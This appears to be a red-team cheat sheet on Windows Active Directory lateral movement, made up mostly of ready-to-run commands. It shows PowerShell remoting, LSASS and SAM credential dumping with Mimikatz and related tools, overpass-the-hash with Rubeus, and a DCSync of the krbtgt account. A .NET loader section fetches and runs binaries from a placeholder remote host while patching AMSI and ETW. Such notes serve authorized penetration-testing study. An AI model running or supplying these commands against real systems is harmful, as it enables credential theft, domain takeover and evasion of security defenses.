# Lateral Movement
* [General](#General)
* [Dumping LSASS](#Dumping-LSASS)
* [Overpass The Hash](#Overpass-The-Hash)
* [DC-Sync](#DC-Sync)
* [Offensive .NET](#Offensive-.NET)
* [Mimikatz](#Mimikatz) 
* [Check Local Admin Access](#Check-Local-Admin-Access)  

## General
#### Connect to machine with administrator privs
```
Enter-PSSession -Computername <COMPUTERNAME>
$sess = New-PSSession -Computername <COMPUTERNAME>
Enter-PSSession $sess
```

#### PSremoting NTLM authetication (after overpass the hash)
```
Enter-PSSession -ComputerName <COMPUTERNAME> -Authentication Negotiate 
```

#### Execute commands on a machine
```
Invoke-Command -Computername <COMPUTERNAME> -Scriptblock {<COMMAND>} 
Invoke-Command -Scriptblock {<COMMAND>} $sess
```

#### Load script on a machine
```
Invoke-Command -Computername <COMPUTERNAME> -FilePath <PATH>
Invoke-Command -FilePath <PATH> $sess
```

#### Execute locally loaded function on a list of remote machines
```
Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content computers.txt)
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
```

#### Runas other user
```
runas /netonly /user:<DOMAIN>\<USER> cmd.exe
runas /netonly /user:<DOMAIN>\<USER> powershell.exe
```

## Dumping LSASS
#### Dump credentials on a local machine using Mimikatz.
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
```

#### Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
```
SafetyKatz.exe "sekurlsa::ekeys"
```

#### Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
```
SharpKatz.exe --Command ekeys
```

#### Dump credentials using Dumpert (Direct System Calls and API unhooking)
```
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

#### Using pypykatz (Mimikatz functionality in Python)
```
pypykatz.exe live lsa
```

#### Using comsvcs.dll
```
tasklist /FI "IMAGENAME eq lsass.exe" 
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS PROCESS ID> C:\Users\Public\lsass.dmp full
```

#### From a Linux attacking machine using impacket.


#### From a Linux attacking machine using Physmem2profit

## Overpass The Hash
- Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)

#### Mimikatz
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
```

#### Mimikatz local admin
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<COMPUTERNAME> /ntlm:<HASH> /run:powershell.exe"'
```

#### SafetyKatz
```
SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:cmd.exe" "exit" 
```

#### Rubeus
- Below doesn't need elevation
```
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM HASH> /ptt
```

- Below command needs elevation
```
Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## DC Sync
- Extract creds from the DC without code execution using DA privileges.

#### Mimikatz DCSync attack
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

#### Safetykatz.exe
```
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

## Offensive .NET
- https://github.com/Flangvik/NetLoader
- Load binary from filepath or URL and patch AMSI & ETW while executing
```
C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
```

#### Use custom exe Assembyload to run netloader in memory and then load binary
```
C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
```

## Mimikatz
#### Mimikatz dump credentials on local machine
```
Invoke-Mimikatz -Dumpcreds
```

#### Mimikatz dump credentials on multiple remote machines
```
Invoke-Mimikatz -Dumpcreds -ComputerName @("<COMPUTERNAME 1>","<COMPUTERNAME2>")
```

#### Mimikatz dump SAM
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
```

or

```
reg save HKLM\SAM SamBkup.hiv
reg save HKLM\System SystemBkup.hiv
#Start mimikatz as administrator
privilege::debug
token::elevate
lsadump::sam SamBkup.hiv SystemBkup.hiv
```

#### Mimikatz dump lsass
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

## Check Local Admin Access
#### Powerview
```
Find-LocalAdminAccess -Verbose
```

#### Mimikatz dump certs
```
Invoke-Mimikatz –DumpCerts
```

### Other scripts
```
. ./Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```

```
. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```
